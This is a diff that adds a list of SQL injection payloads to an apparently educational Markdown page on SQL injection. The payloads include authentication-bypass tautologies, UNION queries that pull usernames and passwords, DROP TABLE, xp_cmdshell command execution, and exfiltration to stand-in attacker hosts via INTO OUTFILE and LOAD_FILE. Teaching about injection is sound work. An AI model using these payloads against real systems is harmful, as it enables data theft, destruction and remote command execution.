@@ -29,3 +29,38 @@ When an attacker manages to manipulate the data query through hacking and transm
 select * from target
 into OUTFILE '\\My Malicious Server  IP'
 ```
+## Payloads
+Some examples of sql injection payloads
+```sql
+'
+
+''
+
+--
+
+'1'='1'
+
+' OR '1'='1
+
+" OR "" = "
+
+' OR 1=1 LIMIT 1 --
+
+; DROP TABLE users; --
+
+1; DROP TABLE users; --
+
+'; SELECT @@VERSION --
+
+1 UNION SELECT 1,2,3,4 --
+
+' UNION SELECT username, password FROM users --
+
+'; BEGIN TRANSACTION; UPDATE users SET balance=balance-100 WHERE username='attacker'; COMMIT; --
+
+AND SLEEP(5)--
+
+'; EXEC xp_cmdshell('dir') --
+
+SELECT LOAD_FILE('\\\\attacker.com\\log.txt')
+```
